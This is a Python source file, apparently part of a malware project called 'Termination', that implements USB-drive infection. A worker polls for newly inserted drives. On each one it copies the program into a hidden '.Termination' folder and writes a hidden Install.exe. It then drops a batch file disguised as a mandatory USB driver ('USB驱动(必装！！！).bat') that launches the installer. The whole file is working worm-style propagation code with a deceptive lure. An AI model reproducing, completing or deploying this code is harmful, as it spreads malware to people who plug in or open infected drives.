from TLib import *
from TLib.T_imports import *
from TLib.T_FIO import *


class InfectionWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.master=master
        self.infectiontools=T_Infection.InfectionTools()
        self.desc="Infection Worker For T4"
        self.od=[]
        while not self.ShouldStop():
            if (ind:=list(set(nd:=self.infectiontools.GetUSBDrives())-set(self.od))) != []:
                for i in ind:
                    ibuf=InfectionInstallWorker(self.master, self, self.infectiontools, i)
                    self.master.TProcessManager.AddThread(ibuf)
                    ibuf.start()
                self.od=nd
            else:
                self.od=self.infectiontools.IsDriveListExist(self.od)
            time.sleep(5)
    def __init_values__(self):
        self.InfectionTactics=InfectionTactics()

class InfectionTactics:
    def __init__(self):
        self.USBDrive="""@echo off
cd \\
.\\Install.exe"""

class InfectionInstallWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', InfectionWorkerBUF: InfectionWorker, infectiontools: T_Infection.InfectionTools, disk):
        self.master=master
        self.InfectionWorkerBUF=InfectionWorkerBUF
        self.infectiontools=infectiontools
        self.desc=f"[Infection] For {disk}"
        print(f"[Infection] For [{disk}]")

        Path_TDir=os.path.join(disk, ".Termination")
        Path_TerminationMainEXE=os.path.join(disk, ".Termination", "Termination.exe" if self.master.GetWorkMod() == "exe" else "Termination.py")
        Path_InstallEXE=os.path.join(disk, "Install.exe")
        Path_USBDrive=os.path.join(disk, "USB驱动(必装！！！).bat")

        os.chmod(Path_TDir, 0o777)
        os.chmod(Path_TerminationMainEXE, 0o777)
        os.chmod(Path_InstallEXE, 0o777)
        os.chmod(Path_USBDrive, 0o777)

        if not self.infectiontools.TestDisk(disk):
            return print(f"[Infection] Failed [{disk}] Test")
        else:
            print(f"[Infection] [{disk}] Test Successful")

        try:
            if not os.path.isdir(Path_TDir):
                os.mkdir(Path_TDir)
            FIO.HideFile(Path_TDir)
        except: return print(f"[Infection] For [{disk}] Unable To Create Folder\nError: [\n{traceback.format_exc()}\n]")

        try:
            FIO.openw(Path_TerminationMainEXE, FIO.openr(self.master.__file__, 2), 2)
        except: return print(f"[Infection] For [{disk}] Unable To Create Termination Main EXE (Py)\nError: [\n{traceback.format_exc()}\n]")

        try:
            FIO.openw(Path_InstallEXE, FIO.openr(self.master.Static_Installt, 2), 2)
            FIO.HideFile(Path_InstallEXE)
        except: return print(f"[Infection] For [{disk}] Unable To Create Termination Main Help EXE\nError: [\n{traceback.format_exc()}\n]")

        try: FIO.openw(Path_USBDrive, self.InfectionWorkerBUF.InfectionTactics.USBDrive)
        except: print(f"[Infection] For [{disk}] Unable To Create Termination Main <USEDrive.bat>\nError: [\n{traceback.format_exc()}\n]")
        print(f"[Infection] For [{disk}] SucessFul")